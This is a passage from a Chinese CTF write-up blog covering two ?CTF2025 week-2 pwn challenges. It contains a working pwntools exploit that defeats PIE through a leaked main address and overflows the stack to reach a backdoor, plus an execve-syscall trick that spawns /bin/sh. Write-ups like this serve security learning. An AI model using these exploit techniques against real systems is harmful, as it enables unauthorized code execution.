<h2 id="Week2-where-are-my-addr"><a href="#Week2-where-are-my-addr" class="headerlink" title="[Week2] where are my addr"></a>[Week2] where are my addr</h2><p>泄露了main地址，因此可以计算出程序的基地址，从而得到<code>backdoor</code>的真实地址</p>
<p>注意栈对齐</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012232001358.png" alt="image-20251012232001358"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b* $(rebase)+0x1264&#x27;)</span></span><br><span class="line"><span class="comment"># challenge.ilovectf.cn:30204</span></span><br><span class="line">sh = remote(<span class="string">&#x27;challenge.ilovectf.cn&#x27;</span>, <span class="number">30204</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x11C9</span></span><br><span class="line">ret_addr = <span class="number">0x11E2</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">backdoor = main_addr - <span class="number">0x126C</span> + backdoor</span><br><span class="line">ret_addr = main_addr - <span class="number">0x126C</span> + ret_addr</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(ret_addr) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Week2-神圣术"><a href="#Week2-神圣术" class="headerlink" title="[Week2] 神圣术"></a>[Week2] 神圣术</h2><p>syscall的了解</p>
<p>输入<code>system call list</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: read    args: fd, buf, count</span><br><span class="line">1: write   args: fd, buf, count</span><br><span class="line">2: open    args: filename, flags, mode</span><br><span class="line">3: close  args: fd</span><br><span class="line">......</span><br><span class="line">59: execve  args: filename, argv, envp</span><br><span class="line">60: exit   args: error_code</span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入<code>system call find</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">krito@underworld:~$ system call find</span><br><span class="line">There are some strings:</span><br><span class="line">/bin/sh : 0x558d25801010</span><br><span class="line">cat ./flag : 0x558d25801018</span><br><span class="line">./flag : 0x558d25801023</span><br><span class="line">There is also a big zone: 0x558d2668a2a0</span><br></pre></td></tr></table></figure>

<p><code>syscall</code>调用<code>execve</code>执行系统命令</p>
<p>这里存在一个坑点，所有的参数都是十进制数字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system call 59 94786769080336 0 0</span><br></pre></td></tr></table></figure></article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/write-up/">write up</a></div><div class="post_share"><div class="social-share" data-image="/%EF%BC%9FCTF2025_week1&amp;week2_WP/%E5%B0%81%E9%9D%A2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025H&amp;NCTF_WP/" title="2025H&amp;NCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./2025H&amp;NCTF/%E5%B0%81%E9%9D%A2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2025H&amp;NCTF WP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/" title="2024春秋杯网络安全联赛夏季赛"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/%E5%B0%81%E9%9D%A2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-07</div><div class="title">2024春秋杯网络安全联赛夏季赛</div></div></a></div><div><a href="/0xGame-week1/" title="0xGame_week1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/banner.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-08</div><div class="title">0xGame_week1</div></div></a></div><div><a href="/2025H&NCTF_WP/" title="2025H&amp;NCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./2025H&NCTF/%E5%B0%81%E9%9D%A2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-08</div><div class="title">2025H&amp;NCTF WP</div></div></a></div><div><a href="/DASCTF/" title="DASCTF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://files.buuoj.cn/files/af4ab817bcd19b8b3618173239af6c0c/11111.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-25</div><div class="title">DASCTF</div></div></a></div><div><a href="/BeginCTF/" title="BeginCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./BeginCTF/%E5%B0%81%E9%9D%A2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-06</div><div class="title">BeginCTF WP</div></div></a></div><div><a href="/HZNUCTF/" title="HZNUCTF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./HZNUCTF/%E5%B0%81%E9%9D%A2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-15</div><div class="title">HZNUCTF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/chenxi.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晨曦</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-secret-of-php"><span class="toc-number">1.1.</span> <span class="toc-text">[Week1] secret of php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%8C%85%E5%90%AB%E4%B8%8D%E6%98%8E%E4%B8%9C%E8%A5%BF%E7%9A%84%E9%A3%9F%E7%89%A9%EF%BC%9F%EF%BC%81"><span class="toc-number">1.2.</span> <span class="toc-text">[Week1] 包含不明东西的食物？！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Ping"><span class="toc-number">1.3.</span> <span class="toc-text">[Week1] Ping??</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%89%8D%E7%AB%AF%E5%B0%8F%E6%B8%B8%E6%88%8F"><span class="toc-number">1.4.</span> <span class="toc-text">[Week1] 前端小游戏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Gitttttttt"><span class="toc-number">1.5.</span> <span class="toc-text">[Week1] Gitttttttt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-from-http"><span class="toc-number">1.6.</span> <span class="toc-text">[Week1] from_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0"><span class="toc-number">1.7.</span> <span class="toc-text">[Week2] 这是什么函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-number">1.8.</span> <span class="toc-text">[Week2] 留言板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Only-Picture-Up"><span class="toc-number">1.9.</span> <span class="toc-text">[Week2] Only Picture Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Regular-Expression"><span class="toc-number">1.10.</span> <span class="toc-text">[Week2] Regular Expression</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E7%99%BB%E5%BD%95%E5%92%8C%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.11.</span> <span class="toc-text">[Week2] 登录和查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Look-at-the-picture"><span class="toc-number">1.12.</span> <span class="toc-text">[Week2] Look at the picture</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Basic-Number-theory"><span class="toc-number">2.1.</span> <span class="toc-text">[Week1] Basic Number theory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-xorRSA"><span class="toc-number">2.2.</span> <span class="toc-text">[Week1] xorRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-two-Es"><span class="toc-number">2.3.</span> <span class="toc-text">[Week1] two Es</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Strange-Machine"><span class="toc-number">2.4.</span> <span class="toc-text">[Week1] Strange Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-beyondHex"><span class="toc-number">2.5.</span> <span class="toc-text">[Week1] beyondHex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-certificate"><span class="toc-number">2.6.</span> <span class="toc-text">[Week1] certificate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-AES-mode"><span class="toc-number">2.7.</span> <span class="toc-text">[Week2] AES_mode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Common-RSA"><span class="toc-number">2.8.</span> <span class="toc-text">[Week2] Common RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-findKey-in-middle"><span class="toc-number">2.9.</span> <span class="toc-text">[Week2] findKey in middle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-baby-Elgamal"><span class="toc-number">2.10.</span> <span class="toc-text">[Week2] baby Elgamal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Furious-BlackCopper"><span class="toc-number">2.11.</span> <span class="toc-text">[Week2] Furious BlackCopper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-strange-random"><span class="toc-number">2.12.</span> <span class="toc-text">[Week2] strange random</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">3.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%8F%96%E8%AF%81%E7%AC%AC%E4%B8%80%E6%AC%A1"><span class="toc-number">3.1.</span> <span class="toc-text">[Week1] 取证第一次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E4%BD%A0%E4%B9%9F%E5%96%9C%E6%AC%A2win7%E5%90%97"><span class="toc-number">3.2.</span> <span class="toc-text">[Week2] 你也喜欢win7吗</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E3%80%8A%E5%85%B3%E4%BA%8E%E6%88%91%E7%A9%BF%E8%B6%8A%E5%88%B0CTF%E7%9A%84%E5%BC%82%E4%B8%96%E7%95%8C%E8%BF%99%E6%A1%A3%E4%BA%8B-%E5%BA%8F%E3%80%8B"><span class="toc-number">4.1.</span> <span class="toc-text">[Week1] 《关于我穿越到CTF的异世界这档事:序》</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E4%BF%B1%E4%B9%90%E9%83%A8%E4%B9%8B%E6%97%85-1-%E9%82%80%E8%AF%B7%E5%87%BD"><span class="toc-number">4.2.</span> <span class="toc-text">[Week1] 俱乐部之旅(1) - 邀请函</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%B8%83%E8%B1%AA%E6%9C%89%E9%BB%91%E5%AE%A2-%E4%B8%80"><span class="toc-number">4.3.</span> <span class="toc-text">[Week1] 布豪有黑客(一)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E6%96%87%E5%8C%96%E6%9C%A8%E7%9A%84%E4%BE%A6%E6%8E%A2%E5%A7%94%E6%89%98-%E4%B8%80"><span class="toc-number">4.4.</span> <span class="toc-text">[Week1] 文化木的侦探委托(一)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E6%9C%8B%E5%8F%8B%E7%9A%84%E6%9D%A5%E4%BF%A1"><span class="toc-number">4.5.</span> <span class="toc-text">[Week1] 维吉尼亚朋友的来信</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E3%80%8A%E5%85%B3%E4%BA%8E%E6%88%91%E7%A9%BF%E8%B6%8A%E5%88%B0CTF%E7%9A%84%E5%BC%82%E4%B8%96%E7%95%8C%E8%BF%99%E6%A1%A3%E4%BA%8B-%E7%A0%B4%E3%80%8B"><span class="toc-number">4.6.</span> <span class="toc-text">[Week2] 《关于我穿越到CTF的异世界这档事:破》</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E4%BF%B1%E4%B9%90%E9%83%A8%E4%B9%8B%E6%97%85-2-%E6%88%91%E9%82%AE%E4%BB%B6%E5%91%A2%EF%BC%9F%EF%BC%9F"><span class="toc-number">4.7.</span> <span class="toc-text">[Week2] 俱乐部之旅(2) - 我邮件呢？？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E7%A0%B4%E7%A2%8E%E7%9A%84%E6%8B%BC%E5%9B%BE"><span class="toc-number">4.8.</span> <span class="toc-text">[Week2] 破碎的拼图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E5%B8%83%E8%B1%AA%E6%9C%89%E9%BB%91%E5%AE%A2-%E4%BA%8C"><span class="toc-number">4.9.</span> <span class="toc-text">[Week2] 布豪有黑客(二)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E6%96%87%E5%8C%96%E6%9C%A8%E7%9A%84%E4%BE%A6%E6%8E%A2%E5%A7%94%E6%89%98-%E4%BA%8C"><span class="toc-number">4.10.</span> <span class="toc-text">[Week2] 文化木的侦探委托(二)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Osint"><span class="toc-number">5.</span> <span class="toc-text">Osint</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Task-1-%E8%A7%81%E9%9D%A2%E5%9C%B0%E7%82%B9"><span class="toc-number">5.1.</span> <span class="toc-text">[Week1] Task 1. 见面地点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Task-2-%E6%96%B9%E5%9D%97%E4%B8%96%E7%95%8C%EF%BC%9F%EF%BC%81"><span class="toc-number">5.2.</span> <span class="toc-text">[Week2] Task 2. 方块世界？！</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re"><span class="toc-number">6.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-8086ASM"><span class="toc-number">6.1.</span> <span class="toc-text">[Week1] 8086ASM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-PlzDebugMe"><span class="toc-number">6.2.</span> <span class="toc-text">[Week1] PlzDebugMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-ezCSharp"><span class="toc-number">6.3.</span> <span class="toc-text">[Week1] ezCSharp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-jvav"><span class="toc-number">6.4.</span> <span class="toc-text">[Week1] jvav</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-ezCalculate"><span class="toc-number">6.5.</span> <span class="toc-text">[Week1] ezCalculate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-rand"><span class="toc-number">6.6.</span> <span class="toc-text">[Week1] rand</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-CPPReverse"><span class="toc-number">6.7.</span> <span class="toc-text">[Week2] CPPReverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Pyc"><span class="toc-number">6.8.</span> <span class="toc-text">[Week2] Pyc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Do-you-like-to-drink-Tea"><span class="toc-number">6.9.</span> <span class="toc-text">[Week2] Do you like to drink Tea?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-UPX"><span class="toc-number">6.10.</span> <span class="toc-text">[Week2] UPX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-base"><span class="toc-number">6.11.</span> <span class="toc-text">[Week2] base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-rc4"><span class="toc-number">6.12.</span> <span class="toc-text">[Week2] rc4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E8%9E%BA%E6%97%8B%E5%AF%86%E7%A0%81%E6%9C%BA"><span class="toc-number">6.13.</span> <span class="toc-text">[Week2] 螺旋密码机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-flowers"><span class="toc-number">6.14.</span> <span class="toc-text">[Week2] flowers</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">7.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-No-vuln"><span class="toc-number">7.1.</span> <span class="toc-text">[Week1] No vuln</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-count"><span class="toc-number">7.2.</span> <span class="toc-text">[Week1] count</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-ncncnc"><span class="toc-number">7.3.</span> <span class="toc-text">[Week1] ncncnc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%8B%87%E8%80%85%E6%95%91%E5%85%AC%E4%B8%BB"><span class="toc-number">7.4.</span> <span class="toc-text">[Week1] 勇者救公主</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%8D%B1%E9%99%A9%E7%9A%84-gets"><span class="toc-number">7.5.</span> <span class="toc-text">[Week1] 危险的 gets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%B9%B8%E8%BF%90%E6%98%9F"><span class="toc-number">7.6.</span> <span class="toc-text">[Week1] 幸运星</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-bird"><span class="toc-number">7.7.</span> <span class="toc-text">[Week2] bird</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-stackoverflow"><span class="toc-number">7.8.</span> <span class="toc-text">[Week2] stackoverflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-where-are-my-addr"><span class="toc-number">7.9.</span> <span class="toc-text">[Week2] where are my addr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E7%A5%9E%E5%9C%A3%E6%9C%AF"><span class="toc-number">7.10.</span> <span class="toc-text">[Week2] 神圣术</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%EF%BC%9FCTF2025_week1&amp;week2_WP/" title="?CTF2025_week1&amp;week2_WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&amp;week2_WP/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="?CTF2025_week1&amp;week2_WP"/></a><div class="content"><a class="title" href="/%EF%BC%9FCTF2025_week1&amp;week2_WP/" title="?CTF2025_week1&amp;week2_WP">?CTF2025_week1&amp;week2_WP</a><time datetime="2025-10-21T11:20:34.000Z" title="发表于 2025-10-21 19:20:34">2025-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025H&amp;NCTF_WP/" title="2025H&amp;NCTF WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./2025H&amp;NCTF/%E5%B0%81%E9%9D%A2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025H&amp;NCTF WP"/></a><div class="content"><a class="title" href="/2025H&amp;NCTF_WP/" title="2025H&amp;NCTF WP">2025H&amp;NCTF WP</a><time datetime="2025-06-08T08:05:00.000Z" title="发表于 2025-06-08 16:05:00">2025-06-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/" title="ctfshow元旦杯_WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow元旦杯_WP"/></a><div class="content"><a class="title" href="/ctfshow_%E5%85%83%E6%97%A6%E6%9D%AF/" title="ctfshow元旦杯_WP">ctfshow元旦杯_WP</a><time datetime="2025-01-06T13:25:34.000Z" title="发表于 2025-01-06 21:25:34">2025-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E8%9C%80%E9%81%93%E5%B1%B1/" title="蜀道山"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./%E8%9C%80%E9%81%93%E5%B1%B1/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蜀道山"/></a><div class="content"><a class="title" href="/%E8%9C%80%E9%81%93%E5%B1%B1/" title="蜀道山">蜀道山</a><time datetime="2024-11-18T04:33:00.000Z" title="发表于 2024-11-18 12:33:00">2024-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/" title="ctfshow_DSBCTF_单身杯"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow_DSBCTF_单身杯"/></a><div class="content"><a class="title" href="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/" title="ctfshow_DSBCTF_单身杯">ctfshow_DSBCTF_单身杯</a><time datetime="2024-11-13T12:15:00.000Z" title="发表于 2024-11-13 20:15:00">2024-11-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/%EF%BC%9FCTF2025_week1&amp;week2_WP/%E5%B0%81%E9%9D%A2.jpg')"><div id="footer-wrap"><div id="ft"></div><div class="copyright"><span><b>&copy;2023 - 2025</b></span><span><b>&nbsp;&nbsp;By 晨曦</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo_v6.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Frame-Hexo-blue.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly_v4.3.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="本站采用多线部署，主线路托管于Vercel"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://user.51.la/" style="margin-inline:5px" title="本站数据分析得益于51la技术支持"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Analytics-51la-3db1eb.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20226665" style="margin-inline:5px" title="本站已加入萌ICP豪华套餐，萌ICP备20226665号"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/萌ICP备-20226665-fe1384.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://bitiful.dogecast.com/buckets" style="margin-inline:5px" title="本网站经Service Worker分流至缤纷云对象存储"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Bucket-缤纷云-9c62da.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.netdun.net/" style="margin-inline:5px" title="本站使用网盾星球提供CDN加速与防护"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/CDN-网盾星球-fff2cc.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="本网站源码由Github提供存储仓库"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg" alt=""/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" 